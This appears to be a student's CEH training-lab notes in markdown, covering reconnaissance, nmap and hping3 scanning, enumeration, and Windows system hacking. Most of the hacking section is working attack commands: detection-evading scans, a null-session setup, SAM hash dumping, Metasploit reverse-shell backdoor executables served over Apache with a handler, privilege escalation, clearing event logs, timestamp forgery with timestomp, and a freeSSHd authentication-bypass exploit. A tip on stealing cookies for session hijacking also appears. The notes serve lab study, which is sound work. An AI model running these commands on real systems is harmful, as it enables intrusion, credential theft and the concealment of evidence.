
##Table of content
 * [foot printing and reconnaissance](#foot-printing-and-reconnaissance) 
 * [scanning networks](#scanning-networks)
 * [enumeration](#enumeration)
 * [System Hacking](#system-hacking)
 * 
 * 
 * 
 * 
 * 


## foot printing and reconnaissance
> tools
 * firebug
 * web spider - web data collector
 * website mirroring tool - httrack_x64-3.47.27
 * email spider - GSA email spider
 * screenshots

> do's and don'ts approval from management

> blueprint of target network
 * IP, IP range
 * purpose of organization
 * size of organization
 * class of IP block
 * people and contact at the target
 * types of OS and network topology in use

1. firebug 
 * add extension to firefox
 * click on firebug --> console --> enable

### console
 * http:// --> plain text password

### HTML
 * head and body --> use these scripts to build clone of website

### CSS

### script
 * view scripts

### DOM
 * find specific version --> narrow down attacks

### NET
 * GET request and time and domain and IP

### Cookies
 * steal cookies and highjack session
 * when you log in cookies tab starts populating

**internal URL, directory structure, cookie details, session IDs etc**

2. Web Spider - Web Data Extractor 8.3 
> download content of website and subsite
 * emails, phones, faxes, urls
 * automate data extraction

3. website mirroring tool - httrack_x64-3.47.27

4. Traceroute: path analyzer pro
ih5Mz9azUU1fsM4Jnl2Nvt1ai2ktloix

## Scanning Networks
tools: kali linux, HPING3, colasoft packet builder, mega ping, nmap

1. Kali Linux

2. HPING3: TCP UDP packet crafting

 check for open port
```hping
hping3 --scan 1-3000 -S IP_Address
```

send packets from random ip
```hping
hping3 ip_address --udp --rand-source --data 500
```

5 ping packet on port 80
``` 
hping3 -S ip_address -p 80 -c 5
```

3. Colasoft packet builder
build ARP frame and send and wait for active machines to reply

4. Network troubleshooting - megaping
scan active ip, netbios info, open ports

5. Network scanning - nmap
windows GUI
```
nmap -O 172.17.19.*
nmap --packet-trace 172.17.19.65

ip_address - show comprehensive scan
```

kali
```
#tcp scan connect - what port is open
nmap -sT -T3 -A 172.17.19.66
#XMAS scan
nmap -sX -T4 172.17.19.66
#ACK probe
nmap -sA -v -T4 172.17.19.66
#udp scan
nmap -sU -T5 172.17.19.66
#IDLE scan
nmap -Pn -p 80 -sI 172.17.19.62 172.17.17.61
#TCP flag scan
#stealth scan
```

6. network scanning - Netscan pro tool
find mac, active host, dhcp server discovery, 
port scanner and ping scanner - illegal

7. avoid scanning detection - multiple decoy ip address

```
#ip fragmentation
nmap -f 172.17.19.61
#send small packets
nmap -mtu 8 172.17.19.61
#decoy IP - send multiple packet with different IP
nmap -D RND:10 172.17.19.61
```

8. vulnerability assessment - nessus

9. draw network diagram - solarwinds Network topology mapper

10. Daisy chaining -Proxy workbench
use machine1 as proxy for my machine --> machine2 as proxy for machine1 etc
annonymity

## enumeration
1. NetBIOS enumeration - Global network inventory
* shows BIOS, printers, services, processor, RAM, last user login etc

2. Enumerating network resource - Advanced IP scanner with radmin

3. Network Enumeration - SuperScan

4. Enumeraing local resources - Hyena

5. Network Enumeration - NetBIOS enumerator

6. Network Enumeration - softPerfect network scanner

7. Network Enumeration - nmap and net use
create null session - anonymous connection

```
# create null session/ shared folder
nbtstat -A 172.17.19.62
# map to null session
net use

# create null session
net use \\172.17.19.62\CEH-Tools ""\user:""
net use \\172.17.19.62\CEH-Tools ""/user:""
```

```
Kali --> nmap 
# ping sweep
nmap -sP 172.17.19.0/24

# stealth SYN scan - all services running
nmap -sS 172.17.19.66

# get version of services to see if it is running old vulnerable ones
nmap -sSV -O 172.17.19.66

# save to file
nmap -sSV -O 172.17.19.66 -oN Enumeration.txt
```

8. SNMP enumeration - SNMPCHECK
kali 
```
# check if SNMP port is open
nmap -sU -p 161 172.19.17.66

# uses default snmp community string
nmap -sU -p 161 --script=snmp-brute 172.19.17.66

# -c is community string found from precious command
snmpcheck -t 172.17.19.66 -c public | more
```

9. LDAP enumeration - ADExplorer (Active Directory Explorer)
need Domain Admin login --> view everything is AD --> better than AD itself

## System Hacking

1. Dumping and Cracking SAM Hashes - pwdump and ophcrack
SAM = security account manager database file in windows
uses LM and NTLM hash

```
# username and pasword has for the machine in a file
pwdump.exe > c:/hash.txt

load this file to ophcrack --> time to crack depends on complexity of password --> only alphanumeric
```

2. Cracking - rainbow tables
pre-calculate hash and create table --> compare new hash to quickly find plaintext

3. Cracking - L0phtCrack

4. Escalating Priviledge - using client side vulnerability
kali
```bash
service postgresql start
service metasploit start

# launch msfconsole
msfconsole

#create exe file in desktop
msf > msfpayload windows/meterpreter/reverse_tcp LHOST=172.17.19.67 X > Desktop/Exploit.exe

# new folder with appropriate permission
mkdir /var/www/share
chmod -R 755 /var/www/share
chown -R www-data:www-data /var/www/share

service apache2 start

cp /root/Desktop/Exploit.exe /var/www/share/

# create msfconsole handler
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
set LHOST 172.17.19.67

# start handler
exploit -j -z

```

from windows
```
http://172.17.19.67/share
download and run Exploit.exe
```

kali
```
# metasploit session should not be open in kali

#now go into meterpreter shell
sessions -i 1

#current user
getuid
>>> ceh\administrator

#require elevated priviledge

#get windows password hash
run hashdump

#clear windows event
clearev

# unrestricted access to system using Service -named pipe impersonation
getsystem -t 1

getuid
>>> nt authority\system

# can run hashdump now
run hashdump 

```

5. exploiting freeSSHd

install freeSSHd in windows and configure on port 45


kali
```
service postgresql start
service metasploit start

msfconsole

use exploit/windows/ssh/freesshd_authbypass


#show available exploits
show options

set RHOST 172.17.19.61
set RPORT 45

# establish meterpreter session
exploit

# possible to capture screenshot, keystroke logging, etc

```

6. hacking windows 8.1 with metasploit and post-exploitation using meterpreter

start postgresql, metasploit
```
msfconsole

msfpayload windows/meterpreter/reverse_tcp LHOST=172.17.19.67 X > Desktop/Backdoor.exe

ls -la /var/www/ | grep share

service apache2 start

cp /root/Desktop/Backdoor.exe /var/www/share/

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
set LHOST 172.17.19.67

show options

exploit -j -z
```

windows --> run backdoor.exe

kali
```
sessions -i

sessions -i 1

# can traverse through this user profile
sysinfo
pwd
ls
cat filename.txt

# show file last access
timestomp filename.txt -v

# change modified timestamp
timestomp filename.txt -m "06/15/2012 12:57:21"

# change created timestamp
timestomp filename.txt -c "06/15/2012 12:57:21"

# change accessed timestamp
timestomp filename.txt -a "06/15/2012 12:57:21"

# change entry modfied timestamp
timestomp filename.txt -e "06/15/2012 12:57:21"
```



























